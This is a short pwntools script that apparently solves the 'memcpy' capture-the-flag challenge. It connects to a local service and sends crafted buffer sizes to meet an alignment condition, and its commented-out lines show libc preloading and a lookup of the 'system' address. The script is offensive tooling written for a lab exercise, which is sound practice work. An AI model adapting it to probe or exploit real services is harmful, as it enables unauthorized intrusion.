from pwn import *
context(arch='i386',log_level='debug')
# p=process("./orw",,env={"LD_PRELOAD":"./libc_32.so.6"})
p=process("./memcpy")

p=remote("0",9022)
p.recvuntil(":D")
for i in range(10):
	for a in range((8<<i),(8<<(i+1))+1):
		if ((a+4)%16>=9 or (a+4)%16==0):
			p.sendlineafter(':',str(a))
			break
	# p.sendlineafter(':',str(8<<i))
# e=ELF('./libc-2.23.so')
# sys_addr=libc_base+e.symbols['system']


p.interactive()